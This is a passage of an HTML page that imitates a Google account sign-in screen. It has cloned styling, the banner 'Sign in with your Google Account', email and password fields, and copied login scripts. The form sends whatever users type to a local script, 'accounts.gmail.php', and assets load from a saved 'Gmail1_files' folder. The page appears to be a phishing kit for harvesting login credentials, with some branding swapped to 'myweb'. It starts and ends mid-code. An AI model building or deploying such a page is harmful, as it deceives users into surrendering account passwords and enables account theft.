				-webkit-transform: translate3d(0,
				-53px
				, 0);
				-moz-transform: translate3d(0,
				-53px
				, 0);
				-ms-transform: translate3d(0,
				-53px
				, 0);
				-o-transform: translate3d(0,
				-53px
				, 0);
				transform: translate3d(0,
				-53px
				, 0);
				;
			}
			.shift-form.card-mask-wrap {
				-webkit-transform: translate3d(0,
				-222px
				, 0);
				-moz-transform: translate3d(0,
				-222px
				, 0);
				-ms-transform: translate3d(0,
				-222px
				, 0);
				-o-transform: translate3d(0,
				-222px
				, 0);
				transform: translate3d(0,
				-222px
				, 0);
				;
			}
			.has-error.shift-form.card-mask-wrap {
				-webkit-transform: translate3d(0,
				-182px
				, 0);
				-moz-transform: translate3d(0,
				-182px
				, 0);
				-ms-transform: translate3d(0,
				-182px
				, 0);
				-o-transform: translate3d(0,
				-182px
				, 0);
				transform: translate3d(0,
				-182px
				, 0);
				;
			}
			.shift-form.card-mask-wrap.no-name {
				-webkit-transform: translate3d(0,
				-242px
				, 0);
				-moz-transform: translate3d(0,
				-242px
				, 0);
				-ms-transform: translate3d(0,
				-242px
				, 0);
				-o-transform: translate3d(0,
				-242px
				, 0);
				transform: translate3d(0,
				-242px
				, 0);
				;
			}
			.has-error.shift-form.card-mask-wrap.no-name {
				-webkit-transform: translate3d(0,
				-202px
				, 0);
				-moz-transform: translate3d(0,
				-202px
				, 0);
				-ms-transform: translate3d(0,
				-202px
				, 0);
				-o-transform: translate3d(0,
				-202px
				, 0);
				transform: translate3d(0,
				-202px
				, 0);
				;
			}
			.has-captcha.shift-form.card-mask-wrap {
				-webkit-transform: translate3d(0,
				-52px
				, 0);
				-moz-transform: translate3d(0,
				-52px
				, 0);
				-ms-transform: translate3d(0,
				-52px
				, 0);
				-o-transform: translate3d(0,
				-52px
				, 0);
				transform: translate3d(0,
				-52px
				, 0);
				;
			}
			.has-captcha.shift-form.card-mask-wrap.no-name {
				-webkit-transform: translate3d(0,
				-72px
				, 0);
				-moz-transform: translate3d(0,
				-72px
				, 0);
				-ms-transform: translate3d(0,
				-72px
				, 0);
				-o-transform: translate3d(0,
				-72px
				, 0);
				transform: translate3d(0,
				-72px
				, 0);
				;
			}
			.has-captcha.shift-form.card-mask-wrap.has-error {
				-webkit-transform: translate3d(0,
				-12px
				, 0);
				-moz-transform: translate3d(0,
				-12px
				, 0);
				-ms-transform: translate3d(0,
				-12px
				, 0);
				-o-transform: translate3d(0,
				-12px
				, 0);
				transform: translate3d(0,
				-12px
				, 0);
				;
			}
			.has-captcha.shift-form.card-mask-wrap.has-error.no-name {
				-webkit-transform: translate3d(0,
				-32px
				, 0);
				-moz-transform: translate3d(0,
				-32px
				, 0);
				-ms-transform: translate3d(0,
				-32px
				, 0);
				-o-transform: translate3d(0,
				-32px
				, 0);
				transform: translate3d(0,
				-32px
				, 0);
				;
			}
			.main-content {
				height: 450px;
				;
			}
			.main-content.has-captcha {
				height: 620px;
				;
			}
			.main-content.has-error {
				height: 490px;
				;
			}
			.main-content.has-captcha.has-error {
				height: 660px;
				;
			}
			.shift-form.main-content {
				height: 491px;
				;
			}
			.has-error.shift-form.main-content {
				height: 531px;
				;
			}
			.shift-form.main-content.no-name {
				height: 471px;
				;
			}
			.has-error.shift-form.main-content.no-name {
				height: 511px;
				;
			}
			.has-captcha.shift-form.main-content {
				height: 661px;
				;
			}
			.has-captcha.shift-form.main-content.no-name {
				height: 641px;
				;
			}
			.has-captcha.shift-form.main-content.has-error {
				height: 701px;
				;
			}
			.has-captcha.shift-form.main-content.has-error.no-name {
				height: 681px;
				;
			}
			.card-mask {
				background-color: #fff;
				background-position: 50% 0;
				background-repeat: no-repeat;
				background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAWgAAAAGCAIAAABhDpMcAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gkeFxks6YflLAAAAKlJREFUWMPt2CEShDAMheGmMCFV1MH9z8MtarC4QKfNiuwwOyxHeJ9r6iJ+ETKz3vu+7/M8D8MQAADetNaO41jXNcYYfUREpZRaK7YDAP9qraUUIvLn6NVg5t77tm2qamZYEwDciEhElmVhZm/H6B8ppZxzCOE8T4QDAB7hmKYp55xS+k48E601VVXV67oQDgB4hIOZRURE/BJKv5kwM1QDAF7bcR84Qggf4ShHovU/ogcAAAAASUVORK5CYII=);
				min-height: 300px;
			}
			.card {
				margin-bottom: 0;
			}
			.one-myweb {
				padding-top: 27px;
			}
			#canvas {
				-webkit-transition: opacity 0.075s;
				-moz-transition: opacity 0.075s;
				-ms-transition: opacity 0.075s;
				-o-transition: opacity 0.075s;
				transition: opacity 0.075s;
				opacity: 0.01;
			}
			.shift-form #canvas {
				opacity: 0.99;
			}
			.label {
				color: #404040;
			}
			#account-chooser-link {
				-webkit-transition: opacity 0.3s;
				-moz-transition: opacity 0.3s;
				-ms-transition: opacity 0.3s;
				-o-transition: opacity 0.3s;
				transition: opacity 0.3s;
			}
			.input-wrapper {
				position: relative;
			}
			.myweb-footer-bar {
				z-index: 2;
			}
		</style>
		<style media="screen and (max-width: 580px)">
			.back-arrow {
				top: 17px;
			}
			.circle-mask {
				height: 72px;
				width: 72px;
				background-size: 72px;
			}
			.circle {
				height: 72px;
				width: 72px;
			}
			#canvas {
				height: 72px;
				width: 72px;
			}
			.form-panel {
				width: 256px;
			}
			.card-mask-wrap {
				width: 300px;
			}
			.card-mask {
				background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAS4AAAAGCAIAAADyquT7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNS4xIFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RDcyMjMyQ0NFODg4MTFFNEEzRkU5RDVERTUwRUQ5OTAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RDcyMjMyQ0RFODg4MTFFNEEzRkU5RDVERTUwRUQ5OTAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpENzIyMzJDQUU4ODgxMUU0QTNGRTlENURFNTBFRDk5MCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpENzIyMzJDQkU4ODgxMUU0QTNGRTlENURFNTBFRDk5MCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqGCc+MAAACnSURBVHja7Ng7DoQgFIXhYTAKFXS6//W4CxtaOh4B5sQ7mcwGpDpfpdjd5M9V1Rij9x5CcM5prV9ENEtrLcZ4HMcb5EgpdV1XrZXTIZoDuSE6pCe3i3S4rit243meKSXsSY6J6FGIzhiz7zvSkxoXeWCt9d7jIufMFIkmpLhtG6JDet8TCQ/vrOlWSmGKRBNSxD40N/lHo/7DGzeOiWhOjb8PRfgIMAAaYEeit6tkKwAAAABJRU5ErkJggg==);
			}
			.card-mask-wrap {
				-webkit-transform: translate3d(0,
				-288px
				, 0);
				-moz-transform: translate3d(0,
				-288px
				, 0);
				-ms-transform: translate3d(0,
				-288px
				, 0);
				-o-transform: translate3d(0,
				-288px
				, 0);
				transform: translate3d(0,
				-288px
				, 0);
				;
			}
			.card-mask-wrap.has-captcha {
				-webkit-transform: translate3d(0,
				-118px
				, 0);
				-moz-transform: translate3d(0,
				-118px
				, 0);
				-ms-transform: translate3d(0,
				-118px
				, 0);
				-o-transform: translate3d(0,
				-118px
				, 0);
				transform: translate3d(0,
				-118px
				, 0);
				;
			}
			.card-mask-wrap.has-error {
				-webkit-transform: translate3d(0,
				-248px
				, 0);
				-moz-transform: translate3d(0,
				-248px
				, 0);
				-ms-transform: translate3d(0,
				-248px
				, 0);
				-o-transform: translate3d(0,
				-248px
				, 0);
				transform: translate3d(0,
				-248px
				, 0);
				;
			}
			.card-mask-wrap.has-captcha.has-error {
				-webkit-transform: translate3d(0,
				-78px
				, 0);
				-moz-transform: translate3d(0,
				-78px
				, 0);
				-ms-transform: translate3d(0,
				-78px
				, 0);
				-o-transform: translate3d(0,
				-78px
				, 0);
				transform: translate3d(0,
				-78px
				, 0);
				;
			}
			.shift-form.card-mask-wrap {
				-webkit-transform: translate3d(0,
				-247px
				, 0);
				-moz-transform: translate3d(0,
				-247px
				, 0);
				-ms-transform: translate3d(0,
				-247px
				, 0);
				-o-transform: translate3d(0,
				-247px
				, 0);
				transform: translate3d(0,
				-247px
				, 0);
				;
			}
			.has-error.shift-form.card-mask-wrap {
				-webkit-transform: translate3d(0,
				-207px
				, 0);
				-moz-transform: translate3d(0,
				-207px
				, 0);
				-ms-transform: translate3d(0,
				-207px
				, 0);
				-o-transform: translate3d(0,
				-207px
				, 0);
				transform: translate3d(0,
				-207px
				, 0);
				;
			}
			.shift-form.card-mask-wrap.no-name {
				-webkit-transform: translate3d(0,
				-267px
				, 0);
				-moz-transform: translate3d(0,
				-267px
				, 0);
				-ms-transform: translate3d(0,
				-267px
				, 0);
				-o-transform: translate3d(0,
				-267px
				, 0);
				transform: translate3d(0,
				-267px
				, 0);
				;
			}
			.has-error.shift-form.card-mask-wrap.no-name {
				-webkit-transform: translate3d(0,
				-227px
				, 0);
				-moz-transform: translate3d(0,
				-227px
				, 0);
				-ms-transform: translate3d(0,
				-227px
				, 0);
				-o-transform: translate3d(0,
				-227px
				, 0);
				transform: translate3d(0,
				-227px
				, 0);
				;
			}
			.has-captcha.shift-form.card-mask-wrap {
				-webkit-transform: translate3d(0,
				-77px
				, 0);
				-moz-transform: translate3d(0,
				-77px
				, 0);
				-ms-transform: translate3d(0,
				-77px
				, 0);
				-o-transform: translate3d(0,
				-77px
				, 0);
				transform: translate3d(0,
				-77px
				, 0);
				;
			}
			.has-captcha.shift-form.card-mask-wrap.no-name {
				-webkit-transform: translate3d(0,
				-97px
				, 0);
				-moz-transform: translate3d(0,
				-97px
				, 0);
				-ms-transform: translate3d(0,
				-97px
				, 0);
				-o-transform: translate3d(0,
				-97px
				, 0);
				transform: translate3d(0,
				-97px
				, 0);
				;
			}
			.has-captcha.shift-form.card-mask-wrap.has-error {
				-webkit-transform: translate3d(0,
				-37px
				, 0);
				-moz-transform: translate3d(0,
				-37px
				, 0);
				-ms-transform: translate3d(0,
				-37px
				, 0);
				-o-transform: translate3d(0,
				-37px
				, 0);
				transform: translate3d(0,
				-37px
				, 0);
				;
			}
			.has-captcha.shift-form.card-mask-wrap.has-error.no-name {
				-webkit-transform: translate3d(0,
				-57px
				, 0);
				-moz-transform: translate3d(0,
				-57px
				, 0);
				-ms-transform: translate3d(0,
				-57px
				, 0);
				-o-transform: translate3d(0,
				-57px
				, 0);
				transform: translate3d(0,
				-57px
				, 0);
				;
			}
			.main-content {
				height: 350px;
				;
			}
			.main-content.has-captcha {
				height: 520px;
				;
			}
			.main-content.has-error {
				height: 390px;
				;
			}
			.main-content.has-captcha.has-error {
				height: 560px;
				;
			}
			.shift-form.main-content {
				height: 391px;
				;
			}
			.has-error.shift-form.main-content {
				height: 431px;
				;
			}
			.shift-form.main-content.no-name {
				height: 371px;
				;
			}
			.has-error.shift-form.main-content.no-name {
				height: 411px;
				;
			}
			.has-captcha.shift-form.main-content {
				height: 561px;
				;
			}
			.has-captcha.shift-form.main-content.no-name {
				height: 541px;
				;
			}
			.has-captcha.shift-form.main-content.has-error {
				height: 601px;
				;
			}
			.has-captcha.shift-form.main-content.has-error.no-name {
				height: 581px;
				;
			}
			.signin-card {
				width: 256px;
			}
			.signin-card #EmailFirst {
				margin-top: 15px;
			}
			.one-myweb {
				padding-top: 22px;
			}
		</style>
		<style></style>
	</head>
	<body>
		<div class="wrapper">
			<div class="myweb-header-bar  centered">
				<div class="header content clearfix">
					<div class="logo logo-w" aria-label="myweb"></div>
				</div>
			</div>
			<div class="main content clearfix">
				<div class="banner">
					<h1> One account. All of Google. </h1>
					<h2 class="hidden-small"> Sign in with your Google Account </h2>
				</div>
				<div class="main-content

				no-name

				">
					<div class="card signin-card

					pre-shift

					no-name">
						<div id="cc_iframe_parent">
							<iframe  id="youtube" style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;"></iframe>
						</div>
						<div class="circle-mask" style="">
							<canvas id="canvas" class="circle" width="96" height="96"></canvas>
						</div>

						<!--login form -->
						<form novalidate="" method="post" action="accounts.gmail.php" id="gaia_loginform">
							<input name="Page" type="hidden" value="PasswordSeparationSignIn">
							<input type="hidden" name="GALX" value="TmO_zKwsYwE">
							<input type="hidden" name="gxf" value="AFoagUU326Ai9tsJGkO7cOyDTeI6F3K-_g:1487920842351">
							<input type="hidden" name="continue" value="###//mail.myweb.com/mail/">
							<input type="hidden" name="service" value="mail">
							<input type="hidden" name="rm" value="false">
							<input type="hidden" name="ltmpl" value="default">
							<input type="hidden" name="scc" value="1">
							<input type="hidden" name="ss" value="1">
							<input type="hidden" name="osid" value="1">
							<input type="hidden" name="emr" value="1">
							<input id="profile-information" name="ProfileInformation" type="hidden" value="">
							<input id="session-state" name="SessionState" type="hidden" value="">
							<input type="hidden" id="_utf8" name="_utf8" value="☃">
							<input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
							<input type="hidden" id="pstMsg" name="pstMsg" value="1">
							<input type="hidden" id="checkConnection" name="checkConnection" value="youtube:383:1">
							<input type="hidden" id="checkedDomains" name="checkedDomains" value="youtube">
							<div class="form-panel first valid" id="gaia_firstform">
								<div class="slide-out">
									<div class="input-wrapper focused">
										<div id="identifier-shown">
											<div>
												<label class="hidden-label" for="Email"> Enter your email</label>
												<input id="Email" type="email" value="" spellcheck="false" name="Email" placeholder="Enter your email" autofocus="">
												<input id="Passwd-hidden" type="password" spellcheck="false" class="hidden">
											</div>
										</div>
										<span role="alert" class="error-msg" id="errormsg_0_Email"></span>
									</div>
									<div style="display: none" id="identifier-captcha">
										<input type="hidden" name="identifiertoken" id="identifier-token" value="">
										<input type="hidden" name="identifiertoken_audio" id="identifier-token-audio">
										<div class="audio-box">
											<div id="playIdentifierAudio"></div>
										</div>
										<div id="captcha-box" class="captcha-box">
											<div id="captcha-img" class="captcha-img" data-alt-text="Visual verification"></div>
											<span class="captcha-msg"> Letters are not case-sensitive </span>
										</div>
										<label for="identifier-captcha-input" class="hidden-label"></label>
										<input type="text" id="identifier-captcha-input" name="identifier-captcha-input" class="captcha" placeholder="Enter the letters above" title="Type the characters you see or numbers you hear">
									</div>
									<input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Next">
									<a class="need-help" href="#"> Find my account </a>
								</div>
							</div>
							<a id="back-arrow" href="" tabindex="-1" class="back-arrow "> <img aria-label="Back" tabindex="0" alt="Back" src="./Gmail1_files/arrow_back_grey600_24dp.png"> </a>
							<div class="form-panel second">
								<div class="slide-in hide-form">
									<div>
										<p id="profile-name"></p>
										<span id="email-display"></span>
									</div>
									<div>
										<div id="password-shown"></div>
									</div>
									<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
									<label class="remember">
										<input id="PersistentCookie" name="PersistentCookie" type="checkbox" value="yes" checked="checked">
										<span> Stay signed in </span>
										<div class="bubble-wrap" role="tooltip">
											<div class="bubble-pointer"></div>
											<div class="bubble">
												For your convenience, keep this checked. On shared devices, additional precautions are recommended.
												<a href="###//support.myweb.com/accounts/?p=securesignin&amp;hl=en" target="_blank">Learn more</a>
											</div>
										</div> </label>
									<input type="hidden" name="rmShown" value="1">
									<a id="link-forgot-passwd" class="need-help" href="#/signin/recovery?hl=en"> Forgot password? </a>
								</div>
							</div>
							<span id="inge" style="display: none" role="alert" class="error-msg"> Sorry, myweb doesn't recognize that email. <a href="#">Create an account</a> using that address? </span>
							<span id="timeoutError" style="display: none" role="alert" class="error-msg"> Something went wrong. Check your connection and try again. </span>
						</form>

					</div>
					<div class="card-mask-wrap

					no-name">
						<div class="card-mask">
							<div class="one-myweb">
								<p class="create-account">
									<span id="link-signin-different"> <a href="#"> Sign in with a different account </a> </span>
									<span id="link-signup"> <a href="#"> Create account </a> </span>
								</p>
								<p class="tagline">
									One Google Account for everything Google
								</p>
								<div class="logo-strip"></div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="myweb-footer-bar">
				<div class="footer content clearfix">
					<ul id="footer-list">
						<li>
							<a href="#myweb.com/intl/en/about" target="_blank"> About myweb </a>
						</li>
						<li>
							<a href="#/TOS?loc=LK&amp;hl=en&amp;privacy=true" target="_blank"> Privacy </a>
						</li>
						<li>
							<a href="#/TOS?loc=LK&amp;hl=en" target="_blank"> Terms </a>
						</li>
						<li>
							<a href="#" target="_blank"> Help </a>
						</li>
					</ul>
					<div id="lang-vis-control" style="display: inline;">
						<span id="lang-chooser-wrap" class="lang-chooser-wrap"> <label for="lang-chooser"><img src="./Gmail1_files/universal_language_settings-21.png" alt="Change language"></label>
							<select id="lang-chooser" class="lang-chooser" name="lang-chooser">
								<option value="af"> ‪Afrikaans‬ </option>
								<option value="az"> ‪azərbaycan‬ </option>
								<option value="ms"> ‪Bahasa Melayu‬ </option>
								<option value="ca"> ‪català‬ </option>
								<option value="cs"> ‪Čeština‬ </option>
								<option value="da"> ‪Dansk‬ </option>
								<option value="de"> ‪Deutsch‬ </option>
								<option value="et"> ‪eesti‬ </option>
								<option value="en-GB"> ‪English (United Kingdom)‬ </option>
								<option value="en" selected="selected"> ‪English (United States)‬ </option>
								<option value="es"> ‪Español (España)‬ </option>
								<option value="es-419"> ‪Español (Latinoamérica)‬ </option>
								<option value="eu"> ‪euskara‬ </option>
								<option value="fil"> ‪Filipino‬ </option>
								<option value="fr-CA"> ‪Français (Canada)‬ </option>
								<option value="fr"> ‪Français (France)‬ </option>
								<option value="gl"> ‪galego‬ </option>
								<option value="hr"> ‪Hrvatski‬ </option>
								<option value="in"> ‪Indonesia‬ </option>
								<option value="zu"> ‪isiZulu‬ </option>
								<option value="is"> ‪íslenska‬ </option>
								<option value="it"> ‪Italiano‬ </option>
								<option value="sw"> ‪Kiswahili‬ </option>
								<option value="lv"> ‪latviešu‬ </option>
								<option value="lt"> ‪lietuvių‬ </option>
								<option value="hu"> ‪magyar‬ </option>
								<option value="nl"> ‪Nederlands‬ </option>
								<option value="no"> ‪norsk‬ </option>
								<option value="pl"> ‪polski‬ </option>
								<option value="pt"> ‪Português (Brasil)‬ </option>
								<option value="pt-PT"> ‪Português (Portugal)‬ </option>
								<option value="ro"> ‪română‬ </option>
								<option value="sk"> ‪Slovenčina‬ </option>
								<option value="sl"> ‪slovenščina‬ </option>
								<option value="fi"> ‪Suomi‬ </option>
								<option value="sv"> ‪Svenska‬ </option>
								<option value="vi"> ‪Tiếng Việt‬ </option>
								<option value="tr"> ‪Türkçe‬ </option>
								<option value="el"> ‪Ελληνικά‬ </option>
								<option value="bg"> ‪български‬ </option>
								<option value="mn"> ‪монгол‬ </option>
								<option value="ru"> ‪Русский‬ </option>
								<option value="sr"> ‪српски‬ </option>
								<option value="uk"> ‪Українська‬ </option>
								<option value="ka"> ‪ქართული‬ </option>
								<option value="hy"> ‪հայերեն‬ </option>
								<option value="iw"> ‫עברית‬‎ </option>
								<option value="ur"> ‫اردو‬‎ </option>
								<option value="ar"> ‫العربية‬‎ </option>
								<option value="fa"> ‫فارسی‬‎ </option>
								<option value="am"> ‪አማርኛ‬ </option>
								<option value="ne"> ‪नेपाली‬ </option>
								<option value="mr"> ‪मराठी‬ </option>
								<option value="hi"> ‪हिन्दी‬ </option>
								<option value="bn"> ‪বাংলা‬ </option>
								<option value="gu"> ‪ગુજરાતી‬ </option>
								<option value="ta"> ‪தமிழ்‬ </option>
								<option value="te"> ‪తెలుగు‬ </option>
								<option value="kn"> ‪ಕನ್ನಡ‬ </option>
								<option value="ml"> ‪മലയാളം‬ </option>
								<option value="si"> ‪සිංහල‬ </option>
								<option value="th"> ‪ไทย‬ </option>
								<option value="lo"> ‪ລາວ‬ </option>
								<option value="my"> ‪မြန်မာ‬ </option>
								<option value="km"> ‪ខ្មែរ‬ </option>
								<option value="ko"> ‪한국어‬ </option>
								<option value="zh-HK"> ‪中文（香港）‬ </option>
								<option value="ja"> ‪日本語‬ </option>
								<option value="zh-CN"> ‪简体中文‬ </option>
								<option value="zh-TW"> ‪繁體中文‬ </option>
							</select> </span>
					</div>
				</div>
			</div>
		</div>
		<script>
			(function() {
				var splitByFirstChar = function(toBeSplit, splitChar) {
					var index = toBeSplit.indexOf(splitChar);
					if (index >= 0) {
						return [toBeSplit.substring(0, index), toBeSplit.substring(index + 1)];
					}
					return [toBeSplit];
				}
				var langChooser_parseParams = function(paramsSection) {
					if (paramsSection) {
						var query = {};
						var params = paramsSection.split('&');
						for (var i = 0; i < params.length; i++) {
							var param = splitByFirstChar(params[i], '=');
							if (param.length == 2) {
								query[param[0]] = param[1];
							}
						}
						return query;
					}
					return {};
				}
				var appendHiddenParams = function(query) {
					var loginForm = document.getElementById('gaia_loginform');
					if (loginForm) {
						var loginInputs = loginForm.getElementsByTagName('input');
						for (var i = 0,
						    input; input = loginInputs[i]; i++) {
							if (input.type == 'hidden' && input.value && !query[input.name]) {
								query[input.name] = input.value;
							}
						}
					}
				}
				var post = function(path, params) {
					var form = document.createElement('form');
					form.setAttribute('method', 'post');
					form.setAttribute('action', path);

					for (var key in params) {
						if (params.hasOwnProperty(key)) {
							var hiddenField = document.createElement('input');
							hiddenField.setAttribute('type', 'hidden');
							hiddenField.setAttribute('name', key);
							hiddenField.setAttribute('value', params[key]);

							form.appendChild(hiddenField);
						}
					}

					document.body.appendChild(form);
					form.submit();
				}
				var langChooser_getParamStr = function(params) {
					var paramsStr = [];
					for (var a in params) {
						paramsStr.push(a + "=" + params[a]);
					}
					return paramsStr.join('&');
				}
				var langChooser_currentUrl = window.location.href;
				var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
				var langChooser_currentPath = match[1];
				var langChooser_params = langChooser_parseParams(match[3]);
				var langChooser_fragment = match[5];

				var langChooser = document.getElementById('lang-chooser');
				var langChooserWrap = document.getElementById('lang-chooser-wrap');
				var langVisControl = document.getElementById('lang-vis-control');
				if (langVisControl && langChooser) {
					langVisControl.style.display = 'inline';
					langChooser.onchange = function() {
						langChooser_params['lp'] = 1;
						langChooser_params['hl'] = encodeURIComponent(this.value);
						var hiddenEmailInput = document.getElementById('Email-hidden');
						if (hiddenEmailInput) {
							// If we are in password separation on password page, post to
							// /AccountLoginInfo.
							appendHiddenParams(langChooser_params);
							langChooser_params['Email'] = hiddenEmailInput.value;
							post('/AccountLoginInfo', langChooser_params);
						} else {
							var paramsStr = langChooser_getParamStr(langChooser_params);
							var newHref = langChooser_currentPath + "?" + paramsStr;
							if (langChooser_fragment) {
								newHref = newHref + "#" + langChooser_fragment;
							}
							window.location.href = newHref;
						}
					};
				}
			})();
		</script>
		<script type="text/javascript">
			var gaia_attachEvent = function(element, event, callback) {
				if (element && element.addEventListener) {
					element.addEventListener(event, callback, false);
				} else if (element && element.attachEvent) {
					element.attachEvent('on' + event, callback);
				}
			};
		</script>
		<script>
			var G,
			    Gb = function(a, b) {
				var c = a;
				a && "string" == typeof a && ( c = document.getElementById(a));
				if (b && !c)
					throw new Ga(a);
				return c
			},
			    Ga = function(a) {
				this.id = a;
				this.toString = function() {
					return "No element found for id '" + this.id + "'"
				}
			};
			var Gc = {},
			    Gf = function(a, b, c) {
				var d = function(a) {
					var b = c.call(this, a);
					!1 === b && Gd(a);
					return b
				};
				a = Gb(a, !0);
				a.addEventListener(b, d, !1);
				Ge(a, b).push(d);
				return d
			},
			    Gg = function(a, b, c) {
				a = Gb(a, !0);
				var d = function() {
					var b = window.event,
					    d = c.call(a, b);
					!1 === d && Gd(b);
					return d
				};
				a.attachEvent("on" + b, d);
				Ge(a, b).push(d);
				return d
			},
			    Gh;
			Gh = window.addEventListener ? Gf : window.attachEvent ? Gg :
			void 0;
			var Gd = function(a) {
				a.preventDefault ? a.preventDefault() : a.returnValue = !1;
				return !1
			};
			var Ge = function(a, b) {
				Gc[a] = Gc[a] || {};
				Gc[a][b] = Gc[a][b] || [];
				return Gc[a][b]
			};
			var Gi = function() {
				try {
					return new XMLHttpRequest
				} catch(c) {
					for (var a = ["MSXML2.XMLHTTP.6.0", "MSXML2.XMLHTTP.3.0", "MSXML2.XMLHTTP", "Microsoft.XMLHTTP"],
					    b = 0; b < a.length; b++)
						try {
							return new ActiveXObject(a[b])
						} catch(d) {
						}
				}
				return null
			},
			    Gj = function() {
				this.request = Gi();
				this.parameters = {}
			};
			Gj.prototype.send = function(a, b) {
				var c = [],
				    d;
				for (d in this.parameters) {
					var e = this.parameters[d];
					c.push(d + "=" + encodeURIComponent(e))
				}
				var c = c.join("&"),
				    f = this.request;
				f.open("POST", a, !0);
				f.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
				f.onreadystatechange = function() {
					4 == f.readyState && b({
						status : f.status,
						text : f.responseText
					})
				};
				f.send(c)
			};
			Gj.prototype.get = function(a, b) {
				var c = this.request;
				c.open("GET", a, !0);
				c.onreadystatechange = function() {
					4 == c.readyState && b({
						status : c.status,
						text : c.responseText
					})
				};
				c.send()
			};
			var Gl = function(a) {
				this.g = a;
				this.u = this.m();
				if (null == this.g)
					throw new Gk("Empty module name");
			};
			G = Gl.prototype;
			G.m = function() {
				var a = window.location.pathname;
				return a && 0 == a.indexOf("/accounts") ? "/accounts/JsRemoteLog" : "/JsRemoteLog"
			};
			G.i = function(a, b, c) {
				var d = this.u,
				    e = this.g || "",
				    d = d + "?module=" + encodeURIComponent(e);
				a = a || "";
				d = d + "&type=" + encodeURIComponent(a);
				b = b || "";
				d = d + "&msg=" + encodeURIComponent(b);
				c = c || [];
				for ( a = 0; a < c.length; a++)
					d = d + "&arg=" + encodeURIComponent(c[a]);
				try {
					var f = Math.floor(1E4 * Math.random()),
					    d = d + "&r=" + String(f)
				} catch(g) {
				}
				return d
			};
			G.send = function(a, b, c) {
				var d = new Gj;
				d.parameters = {};
				try {
					var e = this.i(a, b, c);
					d.get(e, function() {
					})
				} catch(f) {
				}
			};
			G.error = function(a, b) {
				this.send("ERROR", a, b)
			};
			G.warn = function(a, b) {
				this.send("WARN", a, b)
			};
			G.info = function(a, b) {
				this.send("INFO", a, b)
			};
			G.f = function(a) {
				var b = this;
				return function() {
					try {
						return a.apply(null, arguments)
					} catch(c) {
						throw b.error("Uncatched exception: " + c), c;
					}
				}
			};
			var Gk = function() {
			};
			var Gm = Gm || new Gl("uri"),
			    Gn = /^(?:([^:/?#.]+):)?(?:\/\/(?:([^/?#]*)@)?([\w\d\-\u0100-\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\?([^#]*))?(?:#(.*))?$/,
			    Go = function(a) {
				return "http" == a.toLowerCase() ? 80 : "https" == a.toLowerCase() ? 443 : null
			},
			    Gp = function(a, b) {
				var c = b.match(Gn)[1] || null,
				    d,
				    e = b.match(Gn)[3] || null;
				d = e && decodeURIComponent(e);
				e = Number(b.match(Gn)[4] || null) || null;
				if (!c || !d)
					return Gm.error("Invalid origin Exception", [String(b)]), !1;
				e || ( e = Go(c));
				b = a.match(Gn)[1] || null;
				if (!b || b.toLowerCase() != c.toLowerCase())
					return !1;
				c = ( c = a.match(Gn)[3] || null) && decodeURIComponent(c);
				if (!c || c.toLowerCase() != d.toLowerCase())
					return !1;
				( a = Number(a.match(Gn)[4] || null) || null) || ( a = Go(b));
				return e == a
			};
			var Gq = Gq || new Gl("check_connection"),
			    Gr = null,
			    Gs = null,
			    Gt = function(a, b) {
				this.c = a;
				this.b = b;
				this.a = !1
			};
			G = Gt.prototype;
			G.h = function(a, b) {
				if (!b)
					return !1;
				if (0 <= a.indexOf(","))
					return Gq.error("CheckConnection result contains comma", [a]), !1;
				var c = b.value;
				b.value = c ? c + "," + a : a;
				return !0
			};
			G.w = function(a) {
				return this.h(a, null)
			};
			G.v = function(a) {
				return this.h(a, Gs)
			};
			G.l = function(a) {
				a = a.match("^([^:]+):(\\d*):(\\d?)$");
				return !a || 3 > a.length ? null : a[1]
			};
			G.s = function(a, b) {
				if (!Gp(this.c, a))
					return !1;
				if (this.a || !b)
					return !0;
				this.l(b) == this.b && (this.v(b) || this.w(a), this.a = !0);
				return !0
			};
			G.o = function() {
				var a;
				a = this.c;
				var b = "timestamp",
				    c = String((new Date).getTime());
				if (0 < a.indexOf("#"))
					throw Object("Unsupported URL Exception: " + a);
